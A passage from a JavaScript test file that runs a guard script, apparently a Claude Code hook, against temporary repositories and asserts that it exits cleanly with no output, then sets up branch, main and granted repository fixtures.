    const result = runNode(GUARD, [], { cwd: dir, env: { ...process.env, HOME, CLAUDE_PROJECT_DIR: dir, TMPDIR: TMP }, input });
    assert.equal(result.status, 0, input);
    assert.equal(result.stdout.trim(), "", input);
    assert.equal(result.stderr, "", input);
  }
});

kept.set("branch", guardRepo(suite));
kept.set("main", guardRepo(suite, { branch: "main" }));
kept.set("granted", grantedRepo(suite));
